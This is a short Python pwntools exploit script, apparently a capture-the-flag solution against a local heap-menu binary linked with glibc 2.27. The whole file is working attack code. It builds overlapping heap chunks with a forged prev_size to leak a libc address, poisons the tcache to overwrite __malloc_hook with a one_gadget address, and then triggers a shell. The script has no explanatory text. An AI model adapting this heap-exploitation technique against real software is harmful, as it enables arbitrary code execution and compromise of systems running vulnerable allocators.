from pwn import*
from LD import*
#context(log_level='debug',arch='amd64',os='linux')
def add(size,data):
	p.sendlineafter('Your choice: ','1')
	p.sendlineafter('Size:',str(size))
	p.sendafter('Data:',data)
def show(index):
	p.sendlineafter('Your choice: ','2')
	p.sendlineafter('Index:',str(index))
def free(index):
	p.sendlineafter('Your choice: ','3')
	p.sendlineafter('Index:',str(index))
#p = process('./main')
LD=change_ld('./main','./ld-2.27.so')
p = LD.process(env={'LD_PRELOAD':'./libc-2.27.so'})
libc = ELF('./libc-2.27.so',checksec=False)
add(0x500,'\n') #0
add(0x68,'\n')  #1
add(0x4F0,'\n') #2
add(0x20,'\n')  #3
free(1)
free(0)
for i in range(9):
	add((0x68-i),'U'*(0x68 - i))
	free(0)
add(0x68,'U'*0x60 + p64(0x580))
free(2)
add(0x500,'\n')
show(0)
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x60 - libc.sym['__malloc_hook'] - 0x10
libc.address = libc_base
malloc_hook =  libc.sym['__malloc_hook']
realloc_hook = libc.sym['__realloc_hook']
og = [0x4F2C5,0x4F322,0x10A38C]
add(0x68,'\n')
free(2)
free(0)
add(0x68,p64(malloc_hook))
add(0x68,'\n')
add(0x68,p64(og[1]+libc_base))
p.sendlineafter('Your choice: ','1')
p.sendlineafter('Size:','16')
p.interactive()
